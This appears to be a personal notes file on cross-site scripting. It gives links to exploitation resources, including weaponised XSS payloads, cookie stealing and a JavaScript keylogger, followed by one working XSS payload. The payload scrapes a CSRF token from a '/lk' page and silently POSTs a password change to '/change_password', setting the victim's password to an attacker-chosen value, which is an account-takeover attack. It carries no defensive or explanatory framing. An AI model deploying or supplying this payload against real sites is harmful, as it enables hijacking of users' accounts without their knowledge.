https://excess-xss.com/
https://labs.detectify.com/2012/11/07/how-to-exploit-an-xss/
https://medium.com/@hakluke/upgrade-xss-from-medium-to-critical-cb96597b6cc4
https://github.com/hakluke/weaponised-XSS-payloads
https://www.exploit-db.com/exploits/20009
http://www.xssed.com/xssinfo
https://security.stackexchange.com/questions/49185/xss-cookie-stealing-without-redirecting-to-another-page
https://github.com/JohnHoder/Javascript-Keylogger

##
https://gist.github.com/The-XSS-Rat?direction=asc&sort=updated
##


```
<script>
var x = new XMLHttpRequest();
x.open("GET", "/lk", true);
x.onreadystatechange = function() {
    if (x.readyState == XMLHttpRequest.DONE) {
        text = x.responseText;
        text = text.substr(text.indexOf('invisible">') + 'invisible">'.length);
        csrf = text.substr(0, text.indexOf('</p>'));
        newdata = JSON.stringify({'new_password':'QWERTYqwerty1',confirm_password:'QWERTYqwerty1','token':csrf});
        y = new XMLHttpRequest();
        y.open("POST", "/change_password", true);
        y.setRequestHeader("Content-type", "application/json");
        y.send(newdata);
    }
};
x.send(null);
</script>
```
